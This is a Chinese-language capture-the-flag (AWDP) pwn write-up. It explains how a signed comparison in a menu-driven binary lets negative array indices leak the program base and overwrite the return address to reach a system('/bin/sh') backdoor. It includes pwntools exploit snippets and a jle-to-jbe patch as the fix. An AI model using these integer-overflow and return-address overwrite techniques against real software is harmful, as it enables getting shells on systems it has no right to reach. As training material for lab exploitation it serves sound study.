后门函数 #

其实这一步应该是打开IDA后做的第一件事：

shift + F12 查看程序的字符串，有时候字符串中会有一些语句帮助我们更快地找到关键代码，也有时候会有一些明显的 win 语句提示我们成功 getshell 或者 成功取得 flag，当然，最有价值的还得是/bin/sh/语句，这提示我们的程序可能存在后门函数，我们可以在之后的构造RO链、调用 system 函数时使用这个字符串。

当然，当我们在函数的引用表里看到 system 函数时应该也会想到类似的事情。

在本题中，

  • 直接看函数的名字中有一个 win 函数，点进去就可以发现这是一个后门函数
  • 双击 system 函数进入.plt.sec段，查看交叉引用XREF可以很快地找到后门函数
  • 双击/bin/sh字符串进入.rodata段，查看交叉引用XREF可以很快地找到后门函数

{
  return system("/bin/sh");

漏洞利用思路 #

IDA 分析完了，思路还是挺清晰的，先泄露出 textbase ，再覆盖返回地址就可以 getshell

泄露 textbase #

泄露地址可以考虑 menu 的选项1：

      v3 = read_long();
      if ( v3 > you )                           // 不能输入大于1的数字
      {
        puts("???");
        exit(1);                                
      }
      printf("accounts[%lld] = %lld\n", v3, v1[v3]);// menu选项1: 以lld的格式打印

注意到判断大小时程序的汇编代码为：

.text:0000000000001431 48 39 45 F0                   cmp     [rbp+var_10], rax
.text:0000000000001435 7E 16                         jle     short loc_144D

采用的是 jle 指令来跳转，而 jle 指令常常与 cmp 结合用于有符号数的比较，所以存在漏洞

（由于是线下赛的AWDP赛制，所以这个时候就可以想想怎么将这个漏洞 fix 好。此处可以简单地用IDA的keypatch插件将jle指令改为jbe指令即可）

  • menu1的代码只做了单边限制，存在整数溢出漏洞

    • 从表面上看，对变量 v3 进行了限制，但是仔细看看汇编代码可以发现，进行的是有符号整型的比较，所以 v3 可以为负数
    • 但是在数组中取值时，数组的索引的类型是 size_t，该类型相当于属于无符号整型
      • 在64位程序中size_t的大小为8 字节

  • 由于前面的检查只是比较是否小于等于1，所以我们可以输入负值，打印出该负值对应的无符号整数索引的accounts数组地址的值

  • 所以我们的数值的二进制码可以为 FFFF FFFF FFFF FFFF

    • 在比较时会被当做有符号整数，所以为-1<1，成功绕过检查

    • 在数组索引时为无符号整数，会打印出一个距离栈很远的地址，有概率打印出可以泄漏textbase的值

    • 这时候就需要我们在gdb中调试进行动态分析了，看看哪个地址可以帮助我们泄漏textbase的值

    • 当然，我们可以直接写一个脚本直接看某几个负数对应的数组的值是什么，直接使用也是可以的

  • 注意！ 如果题目有提供 libc 文件 需要 patchelf 更换 libc 库与 ld 链接器，不然内存地址的值会和我们远程打靶机是不一样，可能会出现本地可以 getshell 而远程打不通的情况

    • 不过本题中题目并没有提供libc，所以直接gdb调试就可以了
from pwn import *

is_debug = 0

if is_debug:
    context.log_level = 'debug'

taolve = process('./pwn')

def _menu1(num):
    taolve.sendlineafter(b'> ', b'1')
    taolve.sendlineafter(b'?', str(num).encode('utf-8'))
    taolve.recvuntil(b'[' + str(num).encode('utf-8') + b'] = ')
    account = taolve.recvline().strip()
    account = int(account.decode(‘utf-8’))
    log.success("account[" + str(num) + "] = " +hex(account))

for i in range(10):

可以看到在account数组的-1、-3、-7的地址上的数值都可以帮助我们泄漏 textbase，这里我们随便选择一个就可以了

覆盖返回地址 #

我们可以考虑 menu 的选项2：

    if ( v4 != 2 )
      break;
    puts("Whose account?");
    v3 = read_long();
    if ( v3 > you )
    {
      puts("???");
      exit(1);
    }
    puts("How much?");
    v2 = read_long();
    v1[v3] = v2;                                // menu选项2: 将v3数列的值更改，可以考虑更改一些关键的数据
    puts("Deposited! Your money is safe with us 100% guarenteed!");

注意到v3数组在栈上的位置： __int64 v1[3]; // [rsp+0h] [rbp-30h] BYREF

所以v3数组在距离 rbp 0x30 的地址，0x30即前6个数组元素，第7个为rbp，所以我们要覆盖掉第8位即v[7]的地址，所以我们要想办法将我们的地址输入到 v[7] 里去

  • 我们需要先绕过一个简单的检测，可以低字节为7的大整数来完成绕过
    • 考虑到v3在经过read_long函数后只是一个long long 整型，所以大整数只需要 16 个十六进制位即可
    • 如 8000 0000 0000 0007

使用windows自带的程序员计算器：

得到 0x8000 0000 0000 0007对应的十进制数为 -9223372036854775801

代码如下：

taolve.sendlineafter(b'> ', b'2')
taolve.sendlineafter(b'?', b'-9223372036854775801')、
backdoor = 0x1318
taolve.sendlineafter(b'?', str(textbase+backdoor).encode('utf-8'))

  • 覆盖完返回地址之后我们需要触发整个函数的 return 才能让程序跳转到后门函数
    • 所以我没要避免触发程序中的exit()函数，让函数执行到break处跳出循环即可触发getshell
taolve.sendlineafter(b'> ', b'3')
